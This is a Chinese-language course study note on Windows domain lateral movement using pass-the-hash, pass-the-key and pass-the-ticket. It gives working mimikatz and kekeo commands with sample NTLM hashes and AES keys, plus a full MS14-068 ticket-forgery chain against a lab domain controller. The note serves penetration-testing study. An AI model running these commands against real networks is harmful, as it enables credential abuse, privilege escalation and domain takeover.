# 2026-08-31 内网安全④：域横向移动——PTH/PTK/PTT 哈希票据传递（mimikatz + kekeo + MS14-068 + Ladon）

> 状态：🧪 理论（课程截图，08-31 课程第二课），待实操
> 承接 08-31 内网安全③：上节课是「服务协议」横向（SMB 445 / WMI 135），这节课是**凭据本身**的横向——不依赖服务协议，直接用 **hash / AES key / Kerberos 票据** 打过去（mimikatz 为主），外加国产工具 Ladon。**同时纠正导图笔误：第三类是 PTT（pass the ticket），不是 PTL。**

## 一、一句话认知

PTH/PTT/PTK 是**凭据传递攻击**的三种形态：把从内存/磁盘搞到的 **NTLM Hash（PTH）**、**AES key（PTK）** 或 **Kerberos 票据（PTT）** 直接注入/传给目标服务完成认证——**不需要明文密码**。这是 wdigest 关闭（KB2871997）后横向渗透的主力手段，也解释了为什么第一课要费劲收集 hash 和票据。

## 二、三种传递概念（导图原话）

| 缩写 | 全称 | 利用的东西 | 一句话 |
|------|------|-----------|--------|
| PTH | pass the hash | **LM 或 NTLM Hash 值** | 用 hash 当密码用 |
| PTT | pass the ticket | **票据凭证 TGT**（Kerberos） | 把票据注入内存冒充身份 |
| PTK | pass the key | **ekeys 的 AES256 值** | 用 AES key 当密码用 |

> 导图上写的 PTH / PTL / PTK 是笔误——课程正文明确是 **PTT**（pass the ticket）。已更新认知。

## 三、知识点：KB2871997 补丁的影响（为什么有 PTH 还要学 PTK/PTT）

```
PTH：没打补丁 → 所有用户都能连接；打了补丁 → 只有 administrator 能连接
PTK：打了补丁 → 所有用户都能连接（采用 aes256 连接）
```

- **KB2871997**（Win7/2008R2/8/2012 等）：移除其他账户（非 administrator）的 NTLM 明文缓存 → PTH 失效面扩大，只剩 administrator 的 hash 还能 PTH
- **禁用 NTLM 认证** 时：PsExec 无法用 ntlm hash 远程连接，**但 mimikatz 仍能攻击成功**（AES key / 票据不依赖 NTLM）
- 对 **8.1/2012R2**（及打了 KB2871997 的 win7/2008r2/8/2012）：可以用 **AES keys 代替 NT hash 实现 PTK 攻击** ← PTK 存在的意义
- 参考文章：https://www.freebuf.com/column/220740.html（待读）

> PTH 原理（课程原话）：内网渗透中很经典的攻击方式——攻击者直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，**不用提供明文密码**。

## 四、案例1：PTH（pass the hash）——mimikatz sekurlsa::pth

> **未打补丁**下的工作组及域连接，ntlm 传递：

```cmd
sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7        # 域环境
sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c  # 工作组
```

- `sekurlsa::pth` 用 **NTLM Hash 启动一个进程**，该进程的网络连接自动以目标用户身份认证（弹出一个 cmd，里面跑命令就是 administrator）
- 域 / 工作组的区别就是 `/domain:` 后写 `god` 还是 `workgroup`；hash 来源 = 第一课收集 / 上节课 Procdump+Mimikatz dump
- 和上节课 SMB 服务的 `-hashes` 传递同源不同路：impacket 的 `-hashes` 是**在线**传 hash 走服务协议；mimikatz `sekurlsa::pth` 是**本地注入**再连

## 五、案例2：PTK（pass the key）——mimikatz ekeys

> **打补丁后**的工作组及域连接，aes256 传递：

```cmd
sekurlsa::ekeys                                    # 第一步：获取 AES（ekeys 列出内存里的 aes256/aes128 key）
sekurlsa::pth /user:mary /domain:god.org /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b   # 第二步：用 aes256 key 传递
```

- 和 PTH 命令结构完全一样，只把 `/ntlm:` 换成 `/aes256:`，key 来源是 `sekurlsa::ekeys`
- 适用场景：**打了补丁 / 禁了 NTLM 的环境**（普通用户 PTH 已失效，AES key 还能打）

## 六、案例3：PTT（pass the ticket）——三种方式（漏洞 / 工具 / 本地票据）

> 总结（课程原话）：**PTT 传递不需本地管理员权限，连接时用主机名连接，基于漏洞、工具、本地票据**。
> ⚠️ 关键实操点：PTT 后访问目标要**连主机名（DNS 名）**而不是 IP——Kerberos SPN 按主机名匹配，连 IP 会认证失败。

### 第一种：利用漏洞 MS14-068（普通用户直接获取域控 SYSTEM 权限）

```
能实现普通用户直接获取域控 system 权限（域提权到域管级别）
```

```cmd
whoami /user                                        # 1. 查看当前 sid（拿 S-1-5-21-xxx-1124 这种）
mimikatz # kerberos::purge                          # 2. 清空当前机器所有凭证（有域成员凭证会影响伪造）
mimikatz # kerberos::list                           #    查看当前机器凭证（确认清干净）
mimikatz # kerberos::ptc 票据文件                    #    将票据注入内存（ptc = pass the cache）

# 3. 利用 ms14-068 生成 TGT 数据（模板）
ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码

# 3. 实例
MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45

mimikatz.exe "kerberos::ptc TGT_mary@god.org.ccache" exit   # 4. 票据注入内存
klist                                                       # 5. 查看凭证列表
dir \\192.168.3.21\c$                                       # 6. 利用（连主机名访问域控共享）
```

- MS14-068 = Kerberos 域提权漏洞（CVE-2014-6324，导图漏洞分支之一，上节课遗留的疑问被这个案例落地了）：普通域用户伪造 TGT 冒充域管
- 链条：查 SID → purge 清凭证 → 生成 TGT（ccache 文件）→ ptc 注入 → klist 验证 → dir 访问

### 第二种：利用工具 kekeo（生成票据 → 导入）

```cmd
# 1. 生成票据（kekeo 用 ntlm hash 换 TGT）
kekeo "tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c"

# 2. 导入票据（mimikatz）
kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi

# 3. 查看凭证
klist

# 4. 利用 net use 载入
dir \\192.168.3.21\c$
```

- kekeo（gentilkiwi 出品，和 mimikatz 同作者）用 **NTLM hash 申请 TGT**，导出 .kirbi 票据文件 → mimikatz `kerberos::ptt` 导入 → 访问
- 适用：有 hash 但环境禁 NTLM / 想走 Kerberos 的场景

### 第三种：利用本地票据（需管理权限）

```cmd
sekurlsa::tickets /export                          # 导出当前机器内存里的所有票据（.kirbi 文件）
kerberos::ptt xxxxxxxxx.xxxx.kirbi                 # 把导出的票据注入
```

- 直接复用机器上**已存在的会话票据**（比如域管登录过这台机器留下的 TGT/TGS），导出→注入→冒充
- ⚠️ 需要管理权限（sekurlsa 模块要 SYSTEM/管理员）——所以课程总结才说"PTT 不需本地管理员权限"指的是**漏洞方式（MS14-068）**，本地票据导出这条是要管理员的

## 七、案例4：国产 Ladon 内网杀器（测试验收）

```
信息收集 - 协议扫描 - 漏洞探针 - 传递攻击等（一站式集成）
```

- Ladon = 国产内网渗透集成工具，把之前学的**信息收集、协议扫描、漏洞探测、各种传递攻击**集成到一起
- 定位：多合一替代多工具串联（类 CobaltStrike 生态里的辅助轮），课程只做验收没展开命令（❓ 具体模块/命令待查）

## 八、总结：内网安全④地图（哈希票据传递）

| 板块 | 内容 |
|------|------|
| 概念 | PTH（LM/NTLM hash）/ PTT（TGT 票据）/ PTK（AES256 key）；导图 PTL 系笔误 = PTT |
| 知识点 | KB2871997：普通用户 PTH 失效 → 只剩 administrator；禁 NTLM → PsExec 挂但 mimikatz 能打；8.1/2012R2+ 可 PTK |
| 案例1 PTH | `sekurlsa::pth /user:x /domain:god|workgroup /ntlm:<hash>` |
| 案例2 PTK | `sekurlsa::ekeys` 拿 aes → `sekurlsa::pth ... /aes256:<key>` |
| 案例3 PTT | ① MS14-068 漏洞（普通用户→域控 SYSTEM，whoami/user → purge → 生成 TGT → ptc → klist → dir）② kekeo（tgt::ask → ptt 导入）③ 本地票据（tickets /export → ptt）|
| 案例4 | Ladon 国产集成工具（信息收集/协议扫描/漏洞探针/传递攻击） |

**一句话串起来**：服务协议横向（SMB/WMI，上节课）是"**用什么路打过去**"，哈希票据传递（这节课）是"**用什么身份打过去**"——PTH 用 hash、PTK 用 AES key、PTT 用票据，KB2871997 之后普通用户 PTH 失效就换 PTK/PTT，禁 NTLM 就上 mimikatz 系；PTT 记得**连主机名不连 IP**。

## 疑问

1. ❓ MS14-068 的漏洞原理？（为什么普通用户能伪造 TGT 冒充域管？PAC 校验缺失？）——课程只给了利用步骤
2. ❓ kekeo 的 tgt::ask 和 MS14-068 伪造 TGT 的区别？（一个用 hash 换合法 TGT、一个伪造带域管 PAC 的 TGT？）
3. ❓ `sekurlsa::pth` 启动的进程具体怎么用？（弹出的 cmd 里直接敲 net use/dir？还是会话怎么保持？）
4. ❓ 本地票据导出（sekurlsa::tickets /export）拿到的 .kirbi 直接 ptt 就能用？票据有效期/目标 SPN 限制？
5. ❓ Ladon 具体有哪些模块命令？（信息收集/扫描/探针/传递的对应命令）
6. ❓ PTT「连接时用主机名连接」——DNS 解析不到主机名时怎么办？（hosts 文件？）
7. ❓ PTK 的 aes256 key 从哪来？（sekurlsa::ekeys 需要先有内存访问权限，等价于先拿管理员？）

## 关联笔记

- [2026-08-31-内网安全-域横向移动SMB与WMI传递.md](./2026-08-31-内网安全-域横向移动SMB与WMI传递.md) — 服务协议横向（SMB/WMI）：PTH 的 hash 也能走 impacket `-hashes`；wdigest 知识点是本课背景
- [2026-08-30(续2)-内网安全-域横向渗透.md](./2026-08-30(续2)-内网安全-域横向渗透.md) — 导图总览：本课展开的是「PTH&PTT&PTK」分支 + 漏洞分支的 CVE-2014-6324（MS14-068）
- [2026-08-30(续)-内网安全-基本认知与信息收集.md](./2026-08-30(续)-内网安全-基本认知与信息收集.md) — hash/票据的来源（mimikatz logonPasswords / dump）
- [加解密算法与编码.md](./加解密算法与编码.md) — NTLM/AES 算法背景

## 待实践

- 案例1：mimikatz `sekurlsa::pth` 分别打域（/domain:god）和工作组（/domain:workgroup）两台机器
- 案例2：`sekurlsa::ekeys` 拿 aes256 → PTK 打补丁环境（3.32 若是打了补丁的 2012 正好验证）
- 案例3：MS14-068 全流程复现（whoami /user → purge → 生成 TGT → ptc → klist → dir \\主机名\c$）；kekeo 生成票据 + ptt；sekurlsa::tickets /export 导本地票据
- 重点验证：PTT 后**连主机名 vs 连 IP** 的差别
- 对照实验：同一台机器，打补丁前后 PTH 的 administrator 与普通用户表现（验证 KB2871997 知识点）
- Ladon 跑一遍信息收集→传递攻击全流程

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
